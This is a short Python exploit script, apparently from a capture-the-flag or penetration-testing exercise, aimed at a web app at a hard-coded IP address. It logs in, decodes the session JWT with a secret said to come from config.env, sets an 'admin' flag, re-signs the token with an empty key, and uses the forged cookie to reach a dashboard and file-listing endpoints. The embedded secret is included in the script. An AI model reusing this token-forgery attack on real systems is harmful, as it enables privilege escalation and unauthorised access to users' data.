#!/usr/bin/python3
import requests
import jwt

url = 'http://3.83.247.91'
secret = 'V3QnvJtrjIgsLhrSCNeKrCaQbfzK23Al' #from config.env

ses = requests.Session()

#res = ses.post(f'{url}:3001/auth/register', json = {'username': 'kek', 'password': 'uwu', 'email': 'kek@mail.com'})
#res = ses.post(f'{url}:3000/register', data = {'username': 'kek', 'password': 'uwu', 'email': 'kek@mail.com'})
#print(res, res.text)

#res = ses.post(f'{url}:3001/auth/login', json = {'username': 'kek', 'password': 'uwu'})
res = ses.post(f'{url}:3000/', data = {'username': 'kek', 'password': 'uwu'})
print(res)#, res.text)

token_encoded = ses.cookies.get('token')
token = jwt.decode(token_encoded, secret, algorithms=['HS256'])
print(token)

token_mod = token.copy()
token_mod['admin'] = True
token_mod_encoded = jwt.encode(token_mod, '', algorithm='HS256')
print(token_mod)

ses.cookies.set('token', token_mod_encoded)

res = ses.get(f'{url}:3000/dashboard')
print(res)#, res.text)

res = ses.get(f'{url}:3000/files/getfiles')
print(res, res.text)

res = ses.get(f'{url}:3000/files/filebyname:test')
print(res, res.text)
